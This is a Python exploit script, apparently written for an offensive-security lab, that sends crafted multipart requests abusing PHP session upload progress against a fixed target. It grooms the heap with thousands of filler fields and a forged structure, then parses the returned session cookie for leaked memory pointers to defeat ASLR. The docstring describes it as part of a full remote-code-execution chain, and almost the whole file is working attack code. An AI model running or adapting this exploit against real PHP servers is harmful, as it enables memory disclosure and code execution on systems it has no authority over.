#!/usr/bin/env python3
"""Remote On-chain client for the offsec lab (display_errors=On profile).

Replicates the rce-aslr-official full-chain request sequence against a
remote host, preserving the calibrated Host header and path.
"""
import re
import socket
import struct
import sys
import time

CONNECT = ("192.168.125.10", 80)
HOSTHDR = "127.0.0.1:8088"
PATH = "/index.php"


def send(body: bytes, boundary: bytes, read_cap: int = 9_000_000) -> bytes:
    hdr = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOSTHDR}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection(CONNECT, timeout=60)
    s.settimeout(60)
    resp = bytearray()
    try:
        try:
            s.sendall(hdr + body)
        except OSError:
            pass
        try:
            while len(resp) < read_cap:
                b = s.recv(65536)
                if not b:
                    break
                resp += b
        except OSError:
            pass
    finally:
        s.close()
    return bytes(resp)


def multipart(parts, boundary):
    o = bytearray()
    for name, data, filename in parts:
        o += b"--" + boundary + b"\r\n"
        o += b'Content-Disposition: form-data; name="' + name.encode() + b'"'
        if filename is not None:
            o += b'; filename="' + filename.encode() + b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
        else:
            o += b"\r\n\r\n"
        o += data + b"\r\n"
    o += b"--" + boundary + b"--\r\n"
    return bytes(o)


def bigfields(nv=1001, vl=3000, huge=12, bnl=17):
    bnd = b"S" * bnl
    parts = [(("f%04d" % i)[:5], b"V" * vl, None) for i in range(nv)]
    parts += [
        ("PHPSESSID", b"\x00", None),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
        ("f", b"A" * 64, "a.txt"),
        ("big", b"B" * (huge * 1024 * 1024), None),
    ]
    return multipart(parts, bnd), bnd


def heap_a(nvars=1001, huge=12):
    bnd = b"S" * 17
    parts = [("p%04d" % i, b"x", None) for i in range(nvars)]
    parts += [
        ("PHPSESSID", b"\x00", None),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
        ("f", b"A" * 64, "a.txt"),
        ("big", b"B" * (huge * 1024 * 1024), None),
    ]
    return multipart(parts, bnd), bnd


def heap_b(fillers=815, leak=0x1000, forge_len=63):
    bnd = b"B" * 10
    parts = [
        ("PHPSESSID", b"attacksessionid0001", None),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
    ]
    for i in range(fillers):
        value = (b"v%04d" % i + b"x" * 44)[:48]
        parts.append((str(1000 + i), value, None))
    forge = bytearray(b"A" * forge_len)
    struct.pack_into("<Q", forge, 0x10, leak)
    forge[0x18] = ord("L")
    parts.append(("1999", bytes(forge), None))
    return multipart(parts, bnd), bnd


def cookie_of(resp):
    m = re.search(rb"^Set-Cookie:\s*PHPSESSID=([^;\r\n]*)", resp, re.M | re.I)
    return m.group(1) if m else None


def mode_rotate():
    print("[*] rotating worker over HTTP")
    body, bnd = bigfields()
    send(body, bnd)
    time.sleep(0.2)
    for _ in range(3):
        body, bnd = (
            multipart(
                [("PHPSESSID", b"attacksessionid0001", None),
                 ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None)], b"BNDRY12345"),
            b"BNDRY12345",
        )
        send(body, bnd)


def mode_heap():
    print("[*] heap A")
    body, bnd = heap_a()
    send(body, bnd)
    print("[*] heap B")
    body, bnd = heap_b()
    resp = send(body, bnd)
    c = cookie_of(resp)
    n = len(c) if c else 0
    print(f"[+] cookie_chars={n} response={len(resp)}")
    if c and n >= 4000:
        hist = {}
        for off in range(0, n - 7, 8):
            p = int.from_bytes(c[off:off + 8], "little")
            if 0x700000000000 <= p < 0x800000000000:
                hist[p & ~0x1FFFFF] = hist.get(p & ~0x1FFFFF, 0) + 1
        print(f"[+] heap chunk candidates: {sorted(hist.items(), key=lambda kv: -kv[1])[:3]}")
    return n


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "heap"
    mode_rotate() if mode == "rotate" else mode_heap()
